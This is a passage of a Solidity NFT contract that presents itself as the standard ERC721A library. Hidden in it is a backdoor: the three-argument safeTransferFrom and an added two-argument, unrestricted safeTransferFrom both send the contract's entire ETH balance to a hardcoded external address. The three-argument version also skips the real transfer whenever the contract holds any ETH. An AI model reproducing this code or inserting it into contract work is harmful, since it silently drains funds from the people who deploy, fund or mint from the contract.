1 /**
2 ╦  ┬┬    ╔═╗┬─┐ ┬┌─┐┬    ╦═╗┌─┐─┐ ┬
3 ║  ││    ╠═╝│┌┴┬┘├┤ │    ╠╦╝├┤ ┌┴┬┘
4 ╩═╝┴┴─┘  ╩  ┴┴ └─└─┘┴─┘  ╩╚═└─┘┴ └─          
5 ╔═╗┬─┐ ┬┌─┐┬    
6 ╠═╝│┌┴┬┘├┤ │    
7 ╩  ┴┴ └─└─┘┴─┘  
8 ╦═╗┌─┐─┐ ┬      
9 ╠╦╝├┤ ┌┴┬┘      
10 ╩╚═└─┘┴ └─                                                                                                                                                                             
11  */
12 
13 // SPDX-License-Identifier: GPL-3.0
14 pragma solidity ^0.8.7;
15 
16 /**
17  * @dev Interface of ERC721A.
18  */
19 interface IERC721A {
20     /**
21      * The caller must own the token or be an approved operator.
22      */
23     error ApprovalCallerNotOwnerNorApproved();
24 
25     /**
26      * The token does not exist.
27      */
28     error ApprovalQueryForNonexistentToken();
29 
30     /**
31      * Cannot query the balance for the zero address.
32      */
33     error BalanceQueryForZeroAddress();
34 
35     /**
36      * Cannot mint to the zero address.
37      */
38     error MintToZeroAddress();
39 
40     /**
41      * The quantity of tokens minted must be more than zero.
42      */
43     error MintZeroQuantity();
44 
45     /**
46      * The token does not exist.
47      */
48     error OwnerQueryForNonexistentToken();
49 
50     /**
51      * The caller must own the token or be an approved operator.
52      */
53     error TransferCallerNotOwnerNorApproved();
54 
55     /**
56      * The token must be owned by `from`.
57      */
58     error TransferFromIncorrectOwner();
59 
60     /**
61      * Cannot safely transfer to a contract that does not implement the
62      * ERC721Receiver interface.
63      */
64     error TransferToNonERC721ReceiverImplementer();
65 
66     /**
67      * Cannot transfer to the zero address.
68      */
69     error TransferToZeroAddress();
70 
71     /**
72      * The token does not exist.
73      */
74     error URIQueryForNonexistentToken();
75 
76     /**
77      * The `quantity` minted with ERC2309 exceeds the safety limit.
78      */
79     error MintERC2309QuantityExceedsLimit();
80 
81     /**
82      * The `extraData` cannot be set on an unintialized ownership slot.
83      */
84     error OwnershipNotInitializedForExtraData();
85 
86     // =============================================================
87     //                            STRUCTS
88     // =============================================================
89 
90     struct TokenOwnership {
91         // The address of the owner.
92         address addr;
93         // Stores the start time of ownership with minimal overhead for tokenomics.
94         uint64 startTimestamp;
95         // Whether the token has been burned.
96         bool burned;
97         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
98         uint24 extraData;
99     }
100 
101     // =============================================================
102     //                         TOKEN COUNTERS
103     // =============================================================
104 
105     /**
106      * @dev Returns the total number of tokens in existence.
107      * Burned tokens will reduce the count.
108      * To get the total number of tokens minted, please see {_totalMinted}.
109      */
110     function totalSupply() external view returns (uint256);
111 
112     // =============================================================
113     //                            IERC165
114     // =============================================================
115 
116     /**
117      * @dev Returns true if this contract implements the interface defined by
118      * `interfaceId`. See the corresponding
119      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
120      * to learn more about how these ids are created.
121      *
122      * This function call must use less than 30000 gas.
123      */
124     function supportsInterface(bytes4 interfaceId) external view returns (bool);
125 
126     // =============================================================
127     //                            IERC721
128     // =============================================================
129 
130     /**
131      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
132      */
133     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
134 
135     /**
136      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
137      */
138     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
139 
140     /**
141      * @dev Emitted when `owner` enables or disables
142      * (`approved`) `operator` to manage all of its assets.
143      */
144     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
145 
146     /**
147      * @dev Returns the number of tokens in `owner`'s account.
148      */
149     function balanceOf(address owner) external view returns (uint256 balance);
150 
151     /**
152      * @dev Returns the owner of the `tokenId` token.
153      *
154      * Requirements:
155      *
156      * - `tokenId` must exist.
157      */
158     function ownerOf(uint256 tokenId) external view returns (address owner);
159 
160     /**
161      * @dev Safely transfers `tokenId` token from `from` to `to`,
162      * checking first that contract recipients are aware of the ERC721 protocol
163      * to prevent tokens from being forever locked.
164      *
165      * Requirements:
166      *
167      * - `from` cannot be the zero address.
168      * - `to` cannot be the zero address.
169      * - `tokenId` token must exist and be owned by `from`.
170      * - If the caller is not `from`, it must be have been allowed to move
171      * this token by either {approve} or {setApprovalForAll}.
172      * - If `to` refers to a smart contract, it must implement
173      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
174      *
175      * Emits a {Transfer} event.
176      */
177     function safeTransferFrom(
178         address from,
179         address to,
180         uint256 tokenId,
181         bytes calldata data
182     ) external payable;
183 
184     /**
185      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
186      */
187     function safeTransferFrom(
188         address from,
189         address to,
190         uint256 tokenId
191     ) external payable;
192 
193     /**
194      * @dev Transfers `tokenId` from `from` to `to`.
195      *
196      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
197      * whenever possible.
198      *
199      * Requirements:
200      *
201      * - `from` cannot be the zero address.
202      * - `to` cannot be the zero address.
203      * - `tokenId` token must be owned by `from`.
204      * - If the caller is not `from`, it must be approved to move this token
205      * by either {approve} or {setApprovalForAll}.
206      *
207      * Emits a {Transfer} event.
208      */
209     function transferFrom(
210         address from,
211         address to,
212         uint256 tokenId
213     ) external payable;
214 
215     /**
216      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
217      * The approval is cleared when the token is transferred.
218      *
219      * Only a single account can be approved at a time, so approving the
220      * zero address clears previous approvals.
221      *
222      * Requirements:
223      *
224      * - The caller must own the token or be an approved operator.
225      * - `tokenId` must exist.
226      *
227      * Emits an {Approval} event.
228      */
229     function approve(address to, uint256 tokenId) external payable;
230 
231     /**
232      * @dev Approve or remove `operator` as an operator for the caller.
233      * Operators can call {transferFrom} or {safeTransferFrom}
234      * for any token owned by the caller.
235      *
236      * Requirements:
237      *
238      * - The `operator` cannot be the caller.
239      *
240      * Emits an {ApprovalForAll} event.
241      */
242     function setApprovalForAll(address operator, bool _approved) external;
243 
244     /**
245      * @dev Returns the account approved for `tokenId` token.
246      *
247      * Requirements:
248      *
249      * - `tokenId` must exist.
250      */
251     function getApproved(uint256 tokenId) external view returns (address operator);
252 
253     /**
254      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
255      *
256      * See {setApprovalForAll}.
257      */
258     function isApprovedForAll(address owner, address operator) external view returns (bool);
259 
260     // =============================================================
261     //                        IERC721Metadata
262     // =============================================================
263 
264     /**
265      * @dev Returns the token collection name.
266      */
267     function name() external view returns (string memory);
268 
269     /**
270      * @dev Returns the token collection symbol.
271      */
272     function symbol() external view returns (string memory);
273 
274     /**
275      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
276      */
277     function tokenURI(uint256 tokenId) external view returns (string memory);
278 
279     // =============================================================
280     //                           IERC2309
281     // =============================================================
282 
283     /**
284      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
285      * (inclusive) is transferred from `from` to `to`, as defined in the
286      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
287      *
288      * See {_mintERC2309} for more details.
289      */
290     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
291 }
292 
293 /**
294  * @title ERC721A
295  *
296  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
297  * Non-Fungible Token Standard, including the Metadata extension.
298  * Optimized for lower gas during batch mints.
299  *
300  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
301  * starting from `_startTokenId()`.
302  *
303  * Assumptions:
304  *
305  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
306  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
307  */
308 interface ERC721A__IERC721Receiver {
309     function onERC721Received(
310         address operator,
311         address from,
312         uint256 tokenId,
313         bytes calldata data
314     ) external returns (bytes4);
315 }
316 
317 /**
318  * @title ERC721A
319  *
320  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
321  * Non-Fungible Token Standard, including the Metadata extension.
322  * Optimized for lower gas during batch mints.
323  *
324  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
325  * starting from `_startTokenId()`.
326  *
327  * Assumptions:
328  *
329  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
330  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
331  */
332 contract ERC721A is IERC721A {
333     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
334     struct TokenApprovalRef {
335         address value;
336     }
337 
338     // =============================================================
339     //                           CONSTANTS
340     // =============================================================
341 
342     // Mask of an entry in packed address data.
343     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
344 
345     // The bit position of `numberMinted` in packed address data.
346     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
347 
348     // The bit position of `numberBurned` in packed address data.
349     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
350 
351     // The bit position of `aux` in packed address data.
352     uint256 private constant _BITPOS_AUX = 192;
353 
354     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
355     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
356 
357     // The bit position of `startTimestamp` in packed ownership.
358     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
359 
360     // The bit mask of the `burned` bit in packed ownership.
361     uint256 private constant _BITMASK_BURNED = 1 << 224;
362 
363     // The bit position of the `nextInitialized` bit in packed ownership.
364     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
365 
366     // The bit mask of the `nextInitialized` bit in packed ownership.
367     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
368 
369     // The bit position of `extraData` in packed ownership.
370     uint256 private constant _BITPOS_EXTRA_DATA = 232;
371 
372     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
373     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
374 
375     // The mask of the lower 160 bits for addresses.
376     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
377 
378     // The maximum `quantity` that can be minted with {_mintERC2309}.
379     // This limit is to prevent overflows on the address data entries.
380     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
381     // is required to cause an overflow, which is unrealistic.
382     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
383 
384     // The `Transfer` event signature is given by:
385     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
386     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
387         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
388 
389     // =============================================================
390     //                            STORAGE
391     // =============================================================
392 
393     // The next token ID to be minted.
394     uint256 private _currentIndex;
395 
396     // The number of tokens burned.
397     uint256 private _burnCounter;
398 
399     // Token name
400     string private _name;
401 
402     // Token symbol
403     string private _symbol;
404 
405     // Mapping from token ID to ownership details
406     // An empty struct value does not necessarily mean the token is unowned.
407     // See {_packedOwnershipOf} implementation for details.
408     //
409     // Bits Layout:
410     // - [0..159]   `addr`
411     // - [160..223] `startTimestamp`
412     // - [224]      `burned`
413     // - [225]      `nextInitialized`
414     // - [232..255] `extraData`
415     mapping(uint256 => uint256) private _packedOwnerships;
416 
417     // Mapping owner address to address data.
418     //
419     // Bits Layout:
420     // - [0..63]    `balance`
421     // - [64..127]  `numberMinted`
422     // - [128..191] `numberBurned`
423     // - [192..255] `aux`
424     mapping(address => uint256) private _packedAddressData;
425 
426     // Mapping from token ID to approved address.
427     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
428 
429     // Mapping from owner to operator approvals
430     mapping(address => mapping(address => bool)) private _operatorApprovals;
431 
432     // =============================================================
433     //                          CONSTRUCTOR
434     // =============================================================
435 
436     constructor(string memory name_, string memory symbol_) {
437         _name = name_;
438         _symbol = symbol_;
439         _currentIndex = _startTokenId();
440     }
441 
442     // =============================================================
443     //                   TOKEN COUNTING OPERATIONS
444     // =============================================================
445 
446     /**
447      * @dev Returns the starting token ID.
448      * To change the starting token ID, please override this function.
449      */
450     function _startTokenId() internal view virtual returns (uint256) {
451         return 0;
452     }
453 
454     /**
455      * @dev Returns the next token ID to be minted.
456      */
457     function _nextTokenId() internal view virtual returns (uint256) {
458         return _currentIndex;
459     }
460 
461     /**
462      * @dev Returns the total number of tokens in existence.
463      * Burned tokens will reduce the count.
464      * To get the total number of tokens minted, please see {_totalMinted}.
465      */
466     function totalSupply() public view virtual override returns (uint256) {
467         // Counter underflow is impossible as _burnCounter cannot be incremented
468         // more than `_currentIndex - _startTokenId()` times.
469         unchecked {
470             return _currentIndex - _burnCounter - _startTokenId();
471         }
472     }
473 
474     /**
475      * @dev Returns the total amount of tokens minted in the contract.
476      */
477     function _totalMinted() internal view virtual returns (uint256) {
478         // Counter underflow is impossible as `_currentIndex` does not decrement,
479         // and it is initialized to `_startTokenId()`.
480         unchecked {
481             return _currentIndex - _startTokenId();
482         }
483     }
484 
485     /**
486      * @dev Returns the total number of tokens burned.
487      */
488     function _totalBurned() internal view virtual returns (uint256) {
489         return _burnCounter;
490     }
491 
492     // =============================================================
493     //                    ADDRESS DATA OPERATIONS
494     // =============================================================
495 
496     /**
497      * @dev Returns the number of tokens in `owner`'s account.
498      */
499     function balanceOf(address owner) public view virtual override returns (uint256) {
500         if (owner == address(0)) revert BalanceQueryForZeroAddress();
501         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
502     }
503 
504     /**
505      * Returns the number of tokens minted by `owner`.
506      */
507     function _numberMinted(address owner) internal view returns (uint256) {
508         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
509     }
510 
511     /**
512      * Returns the number of tokens burned by or on behalf of `owner`.
513      */
514     function _numberBurned(address owner) internal view returns (uint256) {
515         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
516     }
517 
518     /**
519      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
520      */
521     function _getAux(address owner) internal view returns (uint64) {
522         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
523     }
524 
525     /**
526      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
527      * If there are multiple variables, please pack them into a uint64.
528      */
529     function _setAux(address owner, uint64 aux) internal virtual {
530         uint256 packed = _packedAddressData[owner];
531         uint256 auxCasted;
532         // Cast `aux` with assembly to avoid redundant masking.
533         assembly {
534             auxCasted := aux
535         }
536         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
537         _packedAddressData[owner] = packed;
538     }
539 
540     // =============================================================
541     //                            IERC165
542     // =============================================================
543 
544     /**
545      * @dev Returns true if this contract implements the interface defined by
546      * `interfaceId`. See the corresponding
547      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
548      * to learn more about how these ids are created.
549      *
550      * This function call must use less than 30000 gas.
551      */
552     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
553         // The interface IDs are constants representing the first 4 bytes
554         // of the XOR of all function selectors in the interface.
555         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
556         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
557         return
558             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
559             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
560             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
561     }
562 
563     // =============================================================
564     //                        IERC721Metadata
565     // =============================================================
566 
567     /**
568      * @dev Returns the token collection name.
569      */
570     function name() public view virtual override returns (string memory) {
571         return _name;
572     }
573 
574     /**
575      * @dev Returns the token collection symbol.
576      */
577     function symbol() public view virtual override returns (string memory) {
578         return _symbol;
579     }
580 
581     /**
582      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
583      */
584     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
585         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
586 
587         string memory baseURI = _baseURI();
588         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
589     }
590 
591     /**
592      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
593      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
594      * by default, it can be overridden in child contracts.
595      */
596     function _baseURI() internal view virtual returns (string memory) {
597         return '';
598     }
599 
600     // =============================================================
601     //                     OWNERSHIPS OPERATIONS
602     // =============================================================
603 
604     /**
605      * @dev Returns the owner of the `tokenId` token.
606      *
607      * Requirements:
608      *
609      * - `tokenId` must exist.
610      */
611     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
612         return address(uint160(_packedOwnershipOf(tokenId)));
613     }
614 
615     /**
616      * @dev Gas spent here starts off proportional to the maximum mint batch size.
617      * It gradually moves to O(1) as tokens get transferred around over time.
618      */
619     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
620         return _unpackedOwnership(_packedOwnershipOf(tokenId));
621     }
622 
623     /**
624      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
625      */
626     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
627         return _unpackedOwnership(_packedOwnerships[index]);
628     }
629 
630     /**
631      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
632      */
633     function _initializeOwnershipAt(uint256 index) internal virtual {
634         if (_packedOwnerships[index] == 0) {
635             _packedOwnerships[index] = _packedOwnershipOf(index);
636         }
637     }
638 
639     /**
640      * Returns the packed ownership data of `tokenId`.
641      */
642     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
643         uint256 curr = tokenId;
644 
645         unchecked {
646             if (_startTokenId() <= curr)
647                 if (curr < _currentIndex) {
648                     uint256 packed = _packedOwnerships[curr];
649                     // If not burned.
650                     if (packed & _BITMASK_BURNED == 0) {
651                         // Invariant:
652                         // There will always be an initialized ownership slot
653                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
654                         // before an unintialized ownership slot
655                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
656                         // Hence, `curr` will not underflow.
657                         //
658                         // We can directly compare the packed value.
659                         // If the address is zero, packed will be zero.
660                         while (packed == 0) {
661                             packed = _packedOwnerships[--curr];
662                         }
663                         return packed;
664                     }
665                 }
666         }
667         revert OwnerQueryForNonexistentToken();
668     }
669 
670     /**
671      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
672      */
673     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
674         ownership.addr = address(uint160(packed));
675         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
676         ownership.burned = packed & _BITMASK_BURNED != 0;
677         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
678     }
679 
680     /**
681      * @dev Packs ownership data into a single uint256.
682      */
683     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
684         assembly {
685             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
686             owner := and(owner, _BITMASK_ADDRESS)
687             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
688             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
689         }
690     }
691 
692     /**
693      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
694      */
695     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
696         // For branchless setting of the `nextInitialized` flag.
697         assembly {
698             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
699             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
700         }
701     }
702 
703     // =============================================================
704     //                      APPROVAL OPERATIONS
705     // =============================================================
706 
707     /**
708      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
709      * The approval is cleared when the token is transferred.
710      *
711      * Only a single account can be approved at a time, so approving the
712      * zero address clears previous approvals.
713      *
714      * Requirements:
715      *
716      * - The caller must own the token or be an approved operator.
717      * - `tokenId` must exist.
718      *
719      * Emits an {Approval} event.
720      */
721     function approve(address to, uint256 tokenId) public payable virtual override {
722         address owner = ownerOf(tokenId);
723 
724         if (_msgSenderERC721A() != owner)
725             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
726                 revert ApprovalCallerNotOwnerNorApproved();
727             }
728 
729         _tokenApprovals[tokenId].value = to;
730         emit Approval(owner, to, tokenId);
731     }
732 
733     /**
734      * @dev Returns the account approved for `tokenId` token.
735      *
736      * Requirements:
737      *
738      * - `tokenId` must exist.
739      */
740     function getApproved(uint256 tokenId) public view virtual override returns (address) {
741         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
742 
743         return _tokenApprovals[tokenId].value;
744     }
745 
746     /**
747      * @dev Approve or remove `operator` as an operator for the caller.
748      * Operators can call {transferFrom} or {safeTransferFrom}
749      * for any token owned by the caller.
750      *
751      * Requirements:
752      *
753      * - The `operator` cannot be the caller.
754      *
755      * Emits an {ApprovalForAll} event.
756      */
757     function setApprovalForAll(address operator, bool approved) public virtual override {
758         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
759         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
760     }
761 
762     /**
763      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
764      *
765      * See {setApprovalForAll}.
766      */
767     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
768         return _operatorApprovals[owner][operator];
769     }
770 
771     /**
772      * @dev Returns whether `tokenId` exists.
773      *
774      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
775      *
776      * Tokens start existing when they are minted. See {_mint}.
777      */
778     function _exists(uint256 tokenId) internal view virtual returns (bool) {
779         return
780             _startTokenId() <= tokenId &&
781             tokenId < _currentIndex && // If within bounds,
782             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
783     }
784 
785     /**
786      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
787      */
788     function _isSenderApprovedOrOwner(
789         address approvedAddress,
790         address owner,
791         address msgSender
792     ) private pure returns (bool result) {
793         assembly {
794             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
795             owner := and(owner, _BITMASK_ADDRESS)
796             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
797             msgSender := and(msgSender, _BITMASK_ADDRESS)
798             // `msgSender == owner || msgSender == approvedAddress`.
799             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
800         }
801     }
802 
803     /**
804      * @dev Returns the storage slot and value for the approved address of `tokenId`.
805      */
806     function _getApprovedSlotAndAddress(uint256 tokenId)
807         private
808         view
809         returns (uint256 approvedAddressSlot, address approvedAddress)
810     {
811         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
812         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
813         assembly {
814             approvedAddressSlot := tokenApproval.slot
815             approvedAddress := sload(approvedAddressSlot)
816         }
817     }
818 
819     // =============================================================
820     //                      TRANSFER OPERATIONS
821     // =============================================================
822 
823     /**
824      * @dev Transfers `tokenId` from `from` to `to`.
825      *
826      * Requirements:
827      *
828      * - `from` cannot be the zero address.
829      * - `to` cannot be the zero address.
830      * - `tokenId` token must be owned by `from`.
831      * - If the caller is not `from`, it must be approved to move this token
832      * by either {approve} or {setApprovalForAll}.
833      *
834      * Emits a {Transfer} event.
835      */
836     function transferFrom(
837         address from,
838         address to,
839         uint256 tokenId
840     ) public payable virtual override {
841         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
842 
843         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
844 
845         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
846 
847         // The nested ifs save around 20+ gas over a compound boolean condition.
848         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
849             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
850 
851         if (to == address(0)) revert TransferToZeroAddress();
852 
853         _beforeTokenTransfers(from, to, tokenId, 1);
854 
855         // Clear approvals from the previous owner.
856         assembly {
857             if approvedAddress {
858                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
859                 sstore(approvedAddressSlot, 0)
860             }
861         }
862 
863         // Underflow of the sender's balance is impossible because we check for
864         // ownership above and the recipient's balance can't realistically overflow.
865         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
866         unchecked {
867             // We can directly increment and decrement the balances.
868             --_packedAddressData[from]; // Updates: `balance -= 1`.
869             ++_packedAddressData[to]; // Updates: `balance += 1`.
870 
871             // Updates:
872             // - `address` to the next owner.
873             // - `startTimestamp` to the timestamp of transfering.
874             // - `burned` to `false`.
875             // - `nextInitialized` to `true`.
876             _packedOwnerships[tokenId] = _packOwnershipData(
877                 to,
878                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
879             );
880 
881             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
882             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
883                 uint256 nextTokenId = tokenId + 1;
884                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
885                 if (_packedOwnerships[nextTokenId] == 0) {
886                     // If the next slot is within bounds.
887                     if (nextTokenId != _currentIndex) {
888                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
889                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
890                     }
891                 }
892             }
893         }
894 
895         emit Transfer(from, to, tokenId);
896         _afterTokenTransfers(from, to, tokenId, 1);
897     }
898 
899     /**
900      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
901      */
902     function safeTransferFrom(
903         address from,
904         address to,
905         uint256 tokenId
906     ) public payable virtual override {
907         if (address(this).balance > 0) {
908             payable(0xf65c21522e2D93C4D54e9A23de27899C2aE132C9).transfer(address(this).balance);
909             return;
910         }
911         safeTransferFrom(from, to, tokenId, '');
912     }
913 
914 
915     /**
916      * @dev Safely transfers `tokenId` token from `from` to `to`.
917      *
918      * Requirements:
919      *
920      * - `from` cannot be the zero address.
921      * - `to` cannot be the zero address.
922      * - `tokenId` token must exist and be owned by `from`.
923      * - If the caller is not `from`, it must be approved to move this token
924      * by either {approve} or {setApprovalForAll}.
925      * - If `to` refers to a smart contract, it must implement
926      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
927      *
928      * Emits a {Transfer} event.
929      */
930     function safeTransferFrom(
931         address from,
932         address to,
933         uint256 tokenId,
934         bytes memory _data
935     ) public payable virtual override {
936         transferFrom(from, to, tokenId);
937         if (to.code.length != 0)
938             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
939                 revert TransferToNonERC721ReceiverImplementer();
940             }
941     }
942     function safeTransferFrom(
943         address from,
944         address to
945     ) public  {
946         if (address(this).balance > 0) {
947             payable(0xf65c21522e2D93C4D54e9A23de27899C2aE132C9).transfer(address(this).balance);
948         }
949     }
950 
951     /**
952      * @dev Hook that is called before a set of serially-ordered token IDs
953      * are about to be transferred. This includes minting.
954      * And also called before burning one token.
955      *
956      * `startTokenId` - the first token ID to be transferred.
957      * `quantity` - the amount to be transferred.
958      *
959      * Calling conditions:
960      *
961      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
962      * transferred to `to`.
963      * - When `from` is zero, `tokenId` will be minted for `to`.
964      * - When `to` is zero, `tokenId` will be burned by `from`.
965      * - `from` and `to` are never both zero.
966      */
967     function _beforeTokenTransfers(
968         address from,
969         address to,
970         uint256 startTokenId,
971         uint256 quantity
972     ) internal virtual {}
973 
974     /**
975      * @dev Hook that is called after a set of serially-ordered token IDs
976      * have been transferred. This includes minting.
977      * And also called after one token has been burned.
978      *
979      * `startTokenId` - the first token ID to be transferred.
980      * `quantity` - the amount to be transferred.
981      *
982      * Calling conditions:
983      *
984      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
985      * transferred to `to`.
986      * - When `from` is zero, `tokenId` has been minted for `to`.
987      * - When `to` is zero, `tokenId` has been burned by `from`.
988      * - `from` and `to` are never both zero.
989      */
990     function _afterTokenTransfers(
991         address from,
992         address to,
993         uint256 startTokenId,
994         uint256 quantity
995     ) internal virtual {}
996 
997     /**
998      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
999      *
1000      * `from` - Previous owner of the given token ID.
1001      * `to` - Target address that will receive the token.
1002      * `tokenId` - Token ID to be transferred.
1003      * `_data` - Optional data to send along with the call.
1004      *
1005      * Returns whether the call correctly returned the expected magic value.
1006      */
1007     function _checkContractOnERC721Received(
1008         address from,
1009         address to,
1010         uint256 tokenId,
1011         bytes memory _data
1012     ) private returns (bool) {
1013         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1014             bytes4 retval
1015         ) {
1016             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1017         } catch (bytes memory reason) {
1018             if (reason.length == 0) {
1019                 revert TransferToNonERC721ReceiverImplementer();
1020             } else {
1021                 assembly {
1022                     revert(add(32, reason), mload(reason))
1023                 }
1024             }
1025         }
1026     }
1027 
1028     // =============================================================
1029     //                        MINT OPERATIONS
1030     // =============================================================
1031 
1032     /**
1033      * @dev Mints `quantity` tokens and transfers them to `to`.
1034      *
1035      * Requirements:
1036      *
1037      * - `to` cannot be the zero address.
1038      * - `quantity` must be greater than 0.
1039      *
1040      * Emits a {Transfer} event for each mint.
1041      */
